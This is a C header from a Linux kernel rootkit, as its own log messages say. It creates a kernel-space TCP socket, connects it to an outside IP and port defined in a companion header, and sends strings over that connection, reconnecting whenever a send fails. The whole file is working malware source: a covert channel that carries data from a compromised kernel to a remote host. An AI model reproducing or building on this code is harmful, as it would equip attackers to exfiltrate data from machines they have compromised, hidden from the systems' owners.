#pragma once
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/socket.h>
#include <net/sock.h>
#include "rk_define.h"

struct socket* rk_sock;

int rk_net_init(void) {
  struct sockaddr_in s_addr;
  int ret = 0;
  rk_sock = (struct socket*)kmalloc(sizeof(struct socket), GFP_KERNEL);
  ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &rk_sock);
  if (ret < 0) {
    printk("rootkit: sock_create_kern failed\n");
    return ret;
  }
  memset(&s_addr, 0, sizeof(s_addr));
  s_addr.sin_family = AF_INET;
  s_addr.sin_port = htons(PORT);
  s_addr.sin_addr.s_addr = in_aton(IP);
  ret = rk_sock->ops->connect(rk_sock, (struct sockaddr*)&s_addr, sizeof(s_addr), 0);
  if (ret != 0) {
    printk("rootkit: rk_sock->ops->connect failed\n");
    return ret;
  }
  return 0;
}

int rk_net_send(char* s) {
  int ret = 0;
  struct msghdr msghdr;
  struct kvec kvec;
  int buf_sz = strlen(s) + 1;
  memset(&msghdr, 0, sizeof(msghdr));
  memset(&kvec, 0, sizeof(kvec));
  kvec.iov_base = s;
  kvec.iov_len = buf_sz;
  ret = kernel_sendmsg(rk_sock, &msghdr, &kvec, 1, buf_sz);
  if (ret < 0) {
    // try again
    rk_net_init();
    ret = kernel_sendmsg(rk_sock, &msghdr, &kvec, 1, buf_sz);
    if (ret < 0) {
      printk("rootkit: kernel_sendmsg failed\n");
      return ret;
    }
  }
  return 0;
}

void rk_net_exit(void) {
  kernel_sock_shutdown(rk_sock, SHUT_RDWR);
  sock_release(rk_sock);
}
